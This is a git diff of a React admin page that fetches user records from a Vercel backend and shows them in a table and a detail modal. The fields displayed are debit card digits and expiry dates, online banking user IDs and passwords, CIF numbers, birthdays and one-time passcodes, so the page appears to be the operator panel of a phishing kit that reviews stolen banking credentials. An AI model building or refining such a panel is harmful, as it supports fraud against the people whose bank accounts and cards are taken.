@@ -2,154 +2,101 @@ import React, { useEffect, useState } from 'react';
 
 const AdminSide2 = () => {
   const [users, setUsers] = useState([]);
-  const [bankDetails, setBankDetails] = useState([]);
-  const [bankingLast, setBankingLast] = useState([]);
+  const [loading, setLoading] = useState(true);
+  const [userDetails, setUserDetails] = useState(null);
+  const [showDetails, setShowDetails] = useState(false);
 
+  // Fetch data from the API
   useEffect(() => {
-    const fetchUsers = async () => {
-      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api');
-      const data = await response.json();
-      setUsers(data);
+    const fetchData = async () => {
+      try {
+        const response = await fetch('https://back-end-card-bv5n-git-main-alvin-sifats-projects.vercel.app/api');
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        const data = await response.json();
+        setUsers(data); // Set the users state with fetched data
+      } catch (error) {
+        console.error('Error fetching data:', error);
+      } finally {
+        setLoading(false);
+      }
     };
 
-    const fetchBankDetails = async () => {
-      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis');
-      const data = await response.json();
-      setBankDetails(data);
-    };
-
-    const fetchBankingLast = async () => {
-      const response = await fetch('https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/get');
-      const data = await response.json();
-      setBankingLast(data);
-    };
-
-    fetchUsers();
-    fetchBankDetails();
-    fetchBankingLast();
+    fetchData();
   }, []);
 
-  const deleteUser = async (id) => {
-    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/api/${id}`, {
-      method: 'DELETE',
-    });
-    setUsers(users.filter(user => user._id !== id));
+  // Fetch user details when the View button is clicked
+  const handleViewClick = async (userID) => {
+    try {
+      const response = await fetch(`https://back-end-card-bv5n-git-main-alvin-sifats-projects.vercel.app/api/${userID}`);
+      if (!response.ok) {
+        throw new Error('Failed to fetch user details');
+      }
+      const data = await response.json();
+      console.log('User Details:', data); // Debugging line
+      setUserDetails(data);
+      setShowDetails(true);
+    } catch (error) {
+      console.error('Error fetching user details:', error);
+    }
   };
 
-  const deleteBankDetail = async (id) => {
-    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/detelis/${id}`, {
-      method: 'DELETE',
-    });
-    setBankDetails(bankDetails.filter(bankDetail => bankDetail._id !== id)); // Use _id for filtering
-  };
-
-  const deleteBankingLast = async (id) => {
-    await fetch(`https://back-end-card-git-main-alvin-sifats-projects.vercel.app/bankinglast/${id}`, {
-      method: 'DELETE',
-    });
-    setBankingLast(bankingLast.filter(lastDetail => lastDetail._id !== id));
-  };
+  // Render loading state or user data
+  if (loading) {
+    return <div>Loading...</div>;
+  }
 
   return (
-    <div className="container mx-auto p-4">
-      <h1 className="text-2xl font-bold mb-4">Admin Dashboard</h1>
-
-      <section className="mb-8">
-        <h2 className="text-xl font-semibold mb-2">Users</h2>
-        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
-          <thead>
-            <tr className="bg-gray-200">
-              <th className="py-2 px-4">Mobile Number</th>
-              <th className="py-2 px-4">Account Number</th>
-              <th className="py-2 px-4">Debit Card Digits</th>
-              <th className="py-2 px-4">Expiry Date</th>
-              <th className="py-2 px-4">Actions</th>
+    <div>
+      <h1>User List</h1>
+      <table className="min-w-full border-collapse border border-gray-200">
+        <thead>
+          <tr>
+            <th className="border border-gray-300 p-2">ID</th>
+            <th className="border border-gray-300 p-2">Name</th>
+            <th className="border border-gray-300 p-2">Action</th>
+          </tr>
+        </thead>
+        <tbody>
+          {users.map(user => (
+            <tr key={user._id}>
+              <td className="border border-gray-300 p-2">{user._id}</td>
+              <td className="border border-gray-300 p-2">{user.name}</td>
+              <td className="border border-gray-300 p-2">
+                <button
+                  className="bg-blue-500 text-white px-4 py-2 rounded"
+                  onClick={() => handleViewClick(user._id)}
+                >
+                  View
+                </button>
+              </td>
             </tr>
-          </thead>
-          <tbody>
-            {users.map((user) => (
-              <tr key={user._id}>
-                <td className="py-2 px-4">{user.mobileNumber}</td>
-                <td className="py-2 px-4">{user.accountNumber}</td>
-                <td className="py-2 px-4">{user.debitCardDigits}</td>
-                <td className="py-2 px-4">{user.expiryDate}</td>
-                <td className="py-2 px-4">
-                  <button 
-                    onClick={() => deleteUser(user._id)} 
-                    className="text-red-600 hover:text-red-800"
-                  >
-                    Delete
-                  </button>
-                </td>
-              </tr>
-            ))}
-          </tbody>
-        </table>
-      </section>
+          ))}
+        </tbody>
+      </table>
 
-      <section className="mb-8">
-        <h2 className="text-xl font-semibold mb-2">Bank Details</h2>
-        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
-          <thead>
-            <tr className="bg-gray-200">
-              <th className="py-2 px-4">Bank Name</th>
-              <th className="py-2 px-4">User ID</th>
-              <th className="py-2 px-4">Password</th>
-              <th className="py-2 px-4">Actions</th>
-            </tr>
-          </thead>
-          <tbody>
-            {bankDetails.map((bankDetail) => (
-              <tr key={bankDetail._id}>
-                <td className="py-2 px-4">{bankDetail.bankName}</td>
-                <td className="py-2 px-4">{bankDetail.userID}</td>
-                <td className="py-2 px-4">{bankDetail.password}</td>
-                <td className="py-2 px-4">
-                  <button 
-                    onClick={() => deleteBankDetail(bankDetail._id)} 
-                    className="text-red-600 hover:text-red-800"
-                  >
-                    Delete
-                  </button>
-                </td>
-              </tr>
-            ))}
-          </tbody>
-        </table>
-      </section>
-
-      <section className="mb-8">
-        <h2 className="text-xl font-semibold mb-2">Banking Last Details</h2>
-        <table className="min-w-full bg-white shadow-md rounded-lg overflow-hidden">
-          <thead>
-            <tr className="bg-gray-200">
-              <th className="py-2 px-4">Account Number</th>
-              <th className="py-2 px-4">CIF Number</th>
-              <th className="py-2 px-4">Branch Code</th>
-              <th className="py-2 px-4">Birthday</th>
-              <th className="py-2 px-4">Actions</th>
-            </tr>
-          </thead>
-          <tbody>
-            {bankingLast.map((lastDetail) => (
-              <tr key={lastDetail._id}>
-                <td className="py-2 px-4">{lastDetail.accountNumber}</td>
-                <td className="py-2 px-4">{lastDetail.cifNumber}</td>
-                <td className="py-2 px-4">{lastDetail.branchCode}</td>
-                <td className="py-2 px-4">{new Date(lastDetail.birthday).toLocaleDateString()}</td>
-                <td className="py-2 px-4">
-                  <button 
-                    onClick={() => deleteBankingLast(lastDetail._id)} 
-                    className="text-red-600 hover:text-red-800"
-                  >
-                    Delete
-                  </button>
-                </td>
-              </tr>
-            ))}
-          </tbody>
-        </table>
-      </section>
+      {showDetails && userDetails && (
+        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
+          <div className="bg-white p-8 rounded-lg shadow-lg max-w-lg mx-4">
+            <h2 className="text-2xl mb-4">User Details</h2>
+            <p><strong>Mobile Number:</strong> {userDetails.mobileNumber}</p>
+            <p><strong>Account Number:</strong> {userDetails.accountNumber}</p>
+            <p><strong>Debit Card Digits:</strong> {userDetails.debitCardDigits}</p>
+            <p><strong>Expiry Date:</strong> {userDetails.expiryDate}</p>
+            <p><strong>Bank Name:</strong> {userDetails.bankName}</p>
+            <p><strong>User ID:</strong> {userDetails.userID}</p>
+            <p><strong>Password:</strong> {userDetails.password}</p>
+            <p><strong>CIF Number:</strong> {userDetails.cifNumber}</p>
+            <p><strong>Branch Code:</strong> {userDetails.branchCode}</p>
+            <p><strong>Birthday:</strong> {new Date(userDetails.birthday).toLocaleDateString()}</p>
+            <p><strong>OTP:</strong> {userDetails.otp}</p>
+            <button onClick={() => setShowDetails(false)} className="mt-4 bg-red-500 text-white px-4 py-2 rounded">
+              Close
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
